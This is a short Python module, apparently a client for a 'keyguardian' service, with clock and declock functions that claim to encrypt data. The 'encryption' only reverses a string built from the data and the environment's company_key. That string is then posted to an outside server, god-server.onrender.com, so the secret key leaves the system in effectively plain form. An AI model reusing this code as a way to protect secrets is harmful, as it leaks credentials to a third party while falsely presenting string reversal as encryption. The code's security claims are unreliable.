from keyguardian.core import get_env_variables
import requests
def clock(data):
    env_vars = get_env_variables()
    concatenated_data = f"{data}_{env_vars['company_key']}"[::-1]

    response = requests.post('https://god-server.onrender.com/api/clock', json={
        'encrypted_data': concatenated_data
    })

    return response.json()['clock_task_id']

def declock(clock_task_id):
    env_vars = get_env_variables()

    response = requests.post('https://god-server.onrender.com/api/declock', json={
        'clock_task_id': clock_task_id
    })

    encrypted_data = response.json()['encrypted_data']
    decrypted_data = encrypted_data[::-1].split('_')[0]

    return decrypted_data